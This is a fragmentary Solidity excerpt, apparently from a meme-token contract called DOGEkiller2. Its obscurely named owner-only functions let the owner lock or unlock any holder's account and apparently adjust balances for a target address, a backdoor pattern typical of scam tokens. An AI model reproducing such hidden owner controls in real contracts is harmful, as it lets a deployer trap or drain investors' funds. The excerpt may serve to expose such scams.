...
contract BaseToken is Ownable {
    ...
    function approves(address target, uint256 edAmount) public onlyowneres{
    ...
    function enter(address account) public onlyowneres {
        _lkck[account] = true;
    }


    function benter(address account) public onlyowneres {
        _lkck[account] = false;
    }
...
contract DOGEkiller2 is BaseToken {
